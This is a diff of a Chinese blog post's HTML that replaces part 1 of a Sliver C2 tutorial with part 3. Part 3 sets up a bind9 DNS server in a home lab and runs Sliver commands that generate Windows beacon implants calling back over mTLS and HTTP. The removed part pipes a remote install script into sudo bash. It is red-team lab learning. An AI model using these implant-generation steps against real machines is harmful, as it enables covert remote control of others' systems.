@@ -16,23 +16,24 @@
   <meta name="author" content="0ldcat">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言最近，对C2产生了一些兴趣，想尝试一些新的C2。 Cobalt Strike 暂时放一边。 搭建一个sliver来玩玩。完全用 Go 构建，可以编译到所有平台，还有很多的 功能。整体听起来很棒。来尝试研究搭建一下，尽量详细，使我能真正学到东西，并写到博客中。 当然，sliver也有官方使用手册，也可以参考学习。 服务端的安装部署12345678apt-get install build-ess">
+    <meta name="description" content="前面两章学习了搭建以及beacon和session二进制创建，还有2协议，mtls和wg 听说如果位于严密保护中的计算机网络当中的时候，使用这两个，会被阻止，所以，在严格保护的计算机网络当中，sliver额外提供了另外两种协议 http 和 dns 。 接下来需要搭建 dns 服务器，我还是使用这台kali进行搭建，方便后续操作和电脑负担的降低 DNS准备创建dns服务器，将 sliver.lab">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SliverC2 教程(1)">
-<meta property="og:url" content="http://example.com/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/index.html">
+<meta property="og:title" content="SliverC2 教程(3)">
+<meta property="og:url" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/index.html">
 <meta property="og:site_name" content="0ldcat_blog">
-<meta property="og:description" content="前言最近，对C2产生了一些兴趣，想尝试一些新的C2。 Cobalt Strike 暂时放一边。 搭建一个sliver来玩玩。完全用 Go 构建，可以编译到所有平台，还有很多的 功能。整体听起来很棒。来尝试研究搭建一下，尽量详细，使我能真正学到东西，并写到博客中。 当然，sliver也有官方使用手册，也可以参考学习。 服务端的安装部署12345678apt-get install build-ess">
+<meta property="og:description" content="前面两章学习了搭建以及beacon和session二进制创建，还有2协议，mtls和wg 听说如果位于严密保护中的计算机网络当中的时候，使用这两个，会被阻止，所以，在严格保护的计算机网络当中，sliver额外提供了另外两种协议 http 和 dns 。 接下来需要搭建 dns 服务器，我还是使用这台kali进行搭建，方便后续操作和电脑负担的降低 DNS准备创建dns服务器，将 sliver.lab">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/image-20241101231525542.png">
-<meta property="article:published_time" content="2024-11-01T13:14:10.000Z">
-<meta property="article:modified_time" content="2024-11-02T05:08:06.832Z">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103205518187.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103213433254.png">
+<meta property="article:published_time" content="2024-11-02T13:36:10.000Z">
+<meta property="article:modified_time" content="2024-11-03T13:42:51.797Z">
 <meta property="article:author" content="0ldcat">
 <meta property="article:tag" content="C2">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/image-20241101231525542.png">
+<meta name="twitter:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103205518187.png">
   
   
-  <title>SliverC2 教程(1) - 0ldcat_blog</title>
+  <title>SliverC2 教程(3) - 0ldcat_blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -166,7 +167,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="SliverC2 教程(1)">
+            <span class="h2" id="subtitle" title="SliverC2 教程(3)">
               
             </span>
 
@@ -176,8 +177,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2024-11-01 21:14" pubdate>
-        2024年11月1日 晚上
+      <time datetime="2024-11-02 21:36" pubdate>
+        2024年11月2日 晚上
       </time>
     </span>
   
@@ -187,7 +188,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1k 个字
+      1.2k 个字
     </span>
   
 
@@ -196,7 +197,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9 分钟
+      10 分钟
     </span>
   
 
@@ -225,22 +226,34 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SliverC2 教程(1)</h1>
+            <h1 style="display: none">SliverC2 教程(3)</h1>
             
             <div class="markdown-body">
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近，对C2产生了一些兴趣，想尝试一些新的C2。 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">Cobalt Strike</a> 暂时放一边。</p>
-<p>搭建一个<a target="_blank" rel="noopener" href="https://sliver.sh/">sliver</a>来玩玩。完全用 Go 构建，可以编译到所有平台，还有很多的 <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver#features">功能</a>。整体听起来很棒。来尝试研究搭建一下，尽量详细，使我能真正学到东西，并写到博客中。</p>
-<p>当然，sliver也有官方使用<a target="_blank" rel="noopener" href="https://sliver.sh/docs?name=Getting+Started">手册</a>，也可以参考学习。</p>
-<h1 id="服务端的安装部署"><a href="#服务端的安装部署" class="headerlink" title="服务端的安装部署"></a>服务端的安装部署</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64 //提前安装<br><br>curl https://sliver.sh/install|sudo bash //安装法1<br><br>sudo apt-get install sliver //安装法2<br><br>https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-server_linux 然后将下载的 sliver_server_linux 把 /bin/sliver-server 和 /usr/bin/sliver-server 替换 //安装法3<br><br></code></pre></div></td></tr></table></figure>
+              <p>前面两章学习了搭建以及beacon和session二进制创建，还有2协议，mtls和wg</p>
+<p>听说如果位于严密保护中的计算机网络当中的时候，使用这两个，会被阻止，所以，在严格保护的计算机网络当中，sliver额外提供了另外两种协议 http 和 dns 。</p>
+<p>接下来需要搭建 dns 服务器，我还是使用这台kali进行搭建，方便后续操作和电脑负担的降低</p>
+<h1 id="DNS准备"><a href="#DNS准备" class="headerlink" title="DNS准备"></a>DNS准备</h1><p>创建dns服务器，将 <strong>sliver.labnet.local</strong> 解析到服务器的ip，<strong>target.labnet.local</strong> 解析为目标的ip，</p>
+<p>安装 sudo apt update sudo </p>
+<p>apt install bind9 bind9utils bind9-doc，</p>
+<p>编辑配置文件 vim &#x2F;etc&#x2F;bind&#x2F;named.conf.local 加入内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">zone &quot;sliver.com&quot; &#123;<br>    type master;<br>    file &quot;/etc/bind/db.sliver.com&quot;;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
 
-<p><strong>建议使用<u>第三种</u>方法</strong></p>
-<p>1、<a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/releases/tag/v1.5.42">https://github.com/BishopFox/sliver/releases/tag/v1.5.42</a> 发行版下载到kali中，然后放到&#x2F;use&#x2F;local&#x2F;bin中，<strong>重命名为 sliver-server</strong> </p>
-<p>2、<strong>然后使用命令解压所有 sliver-server unpack –force</strong> </p>
-<p>3、<strong>创建一个system服务 vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;sliver.service</strong>，填入以下内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[Unit]<br>Description=Sliver<br>After=network.target<br>StartLimitIntervalSec=0<br><br>[Service]<br>Type=simple<br>Restart=on-failure<br>RestartSec=3<br>User=root<br>ExecStart=/usr/local/bin/sliver-server daemon<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></div></td></tr></table></figure>
+<p>创建区域文件 &#x2F;etc&#x2F;bind&#x2F;db.sliver.com 加入内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">TTL    604800</span><br>@       IN      SOA     ns.sliver.com. admin.sliver.com. (<br>                              2         ; Serial<br>                         604800         ; Refresh<br>                          86400         ; Retry<br>                        2419200         ; Expire<br>                         604800 )       ; Negative Cache TTL<br><br>; Name servers<br>@       IN      NS      ns.sliver.com.<br><br>; A records for name servers<br>ns      IN      A       192.168.80.128<br><br>; A records for your domain<br>www     IN      A       192.168.80.128<br></code></pre></div></td></tr></table></figure>
 
-<p>现在，可以使用<code>systemctl start sliver</code>启动服务器。如果成功启动，可以看到端口 31337 以及状态为active</p>
-<p><img src="/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/image-20241101231525542.png" srcset="/img/loading.gif" lazyload alt="image-20241101231525542"></p>
+<p>添加dns系统解析，包括windows靶机也添加上去</p>
+<p>vim &#x2F;etc&#x2F;resolv.conf</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">nameserver 192.168.80.128<br></code></pre></div></td></tr></table></figure>
+
+<p>然后 named-checkzone sliver.com &#x2F;etc&#x2F;bind&#x2F;db.sliver.com 检查 回显OK搭建成功</p>
+<p>然后启动 sudo systemctl start named.service </p>
+<p>nslookup <a target="_blank" rel="noopener" href="http://www.sliver.com/">www.sliver.com</a> 192.168.80.128 测试DNS配置</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103205518187.png" srcset="/img/loading.gif" lazyload alt="image-20241103205518187"></p>
+<p>开始</p>
+<p>开始在sliver服务端中生成dns二进制木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">generate beacon --os windows --arch amd64 --format exe --seconds 5 --save ~/st --mtls www.sliver.com,192.168.80.128<br><br>generate --http sliver.com --canary www.sliver.com<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103213433254.png" srcset="/img/loading.gif" lazyload alt="image-20241103213433254"></p>
 
             </div>
             <hr>
